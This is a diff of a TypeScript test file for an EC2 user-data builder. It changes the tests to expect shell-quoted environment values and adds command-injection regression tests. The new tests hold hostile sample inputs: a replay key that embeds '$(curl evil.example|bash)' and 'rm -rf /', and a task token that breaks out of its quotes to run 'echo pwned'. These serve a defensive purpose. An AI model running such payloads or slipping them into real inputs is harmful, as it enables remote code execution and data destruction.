@@ -1,3 +1,4 @@
+import { execFileSync } from "node:child_process";
 import { beforeEach, describe, expect, it } from "vitest";
 import {
   CreateFleetCommand,
@@ -78,11 +79,12 @@ describe("buildUserData", () => {
     const decoded = Buffer.from(buildUserData(config, job, "task-token-abc"), "base64").toString(
       "utf-8",
     );
-    expect(decoded).toContain("JOB_ID=job-1");
-    expect(decoded).toContain("REPLAY_KEY=replays/abc.rpy");
-    expect(decoded).toContain("OUTPUT_BUCKET=out-bucket");
-    expect(decoded).toContain("TITLE_ASSETS_BUCKET=title-assets-bucket");
-    expect(decoded).toContain("WATERMARK=1");
+    // 環境変数の値は単一引用符で括られる(Issue #127 SEC-1、shellEscape())。
+    expect(decoded).toContain("JOB_ID='job-1'");
+    expect(decoded).toContain("REPLAY_KEY='replays/abc.rpy'");
+    expect(decoded).toContain("OUTPUT_BUCKET='out-bucket'");
+    expect(decoded).toContain("TITLE_ASSETS_BUCKET='title-assets-bucket'");
+    expect(decoded).toContain("WATERMARK='1'");
     expect(decoded).toContain(config.workerImage);
     // ECR ログイン先レジストリが正しく抽出されている
     expect(decoded).toContain("123456789012.dkr.ecr.ap-northeast-1.amazonaws.com");
@@ -96,7 +98,7 @@ describe("buildUserData", () => {
     // taskToken と進捗算出用の推定再生時間を渡す
     expect(decoded).toContain("TASK_TOKEN='task-token-abc'");
     expect(decoded).toContain('-e TASK_TOKEN="$TASK_TOKEN"');
-    expect(decoded).toContain("EXPECTED_DURATION_SECONDS=900");
+    expect(decoded).toContain("EXPECTED_DURATION_SECONDS='900'");
     // コンテナ起動前(ECR ログイン/pull)の失敗は bash から直接 SendTaskFailure する
     expect(decoded).toContain("send-task-failure");
     expect(decoded).toContain("docker pull");
@@ -107,7 +109,7 @@ describe("buildUserData", () => {
       buildUserData(config, { ...job, options: { watermark: false, slowMotion: false } }, "task-token-abc"),
       "base64",
     ).toString("utf-8");
-    expect(decoded).toContain("WATERMARK=0");
+    expect(decoded).toContain("WATERMARK='0'");
   });
 
   it("estimatedDurationSeconds が null なら EXPECTED_DURATION_SECONDS を付与しない", () => {
@@ -116,6 +118,30 @@ describe("buildUserData", () => {
       "base64",
     ).toString("utf-8");
     expect(decoded).not.toContain("EXPECTED_DURATION_SECONDS");
+  });
+
+  it("環境変数の値にシェルメタ文字が混ざっていてもコマンドインジェクションにならない（Issue #127 SEC-1）", () => {
+    // 入口検証をすり抜けた／既存の汚染データを想定した多層防御の確認。
+    const maliciousReplayKey = "replays/x.rpy$(curl evil.example|bash);'; rm -rf /; echo '";
+    const decoded = Buffer.from(
+      buildUserData(config, { ...job, replayKey: maliciousReplayKey }, "task-token-abc"),
+      "base64",
+    ).toString("utf-8");
+    // シングルクォートを閉じてエスケープ済みのクォートを挟み再度開く形になっている
+    expect(decoded).toContain(
+      `REPLAY_KEY='replays/x.rpy$(curl evil.example|bash);'\\''; rm -rf /; echo '\\'''`,
+    );
+    // `bash -n` で実際に構文解析させ、注入された `$(...)`・`;` が独立したコマンドとして
+    // 解釈されない(=1つの文字列リテラルの中に留まる)ことを確認する。実行はしない。
+    expect(() => execFileSync("bash", ["-n"], { input: decoded })).not.toThrow();
+  });
+
+  it("taskTokenにシングルクォートが混ざっていても壊れない", () => {
+    const decoded = Buffer.from(buildUserData(config, job, "abc'; echo pwned; '"), "base64").toString(
+      "utf-8",
+    );
+    expect(decoded).toContain(`TASK_TOKEN='abc'\\''; echo pwned; '\\'''`);
+    expect(() => execFileSync("bash", ["-n"], { input: decoded })).not.toThrow();
   });
 });
 
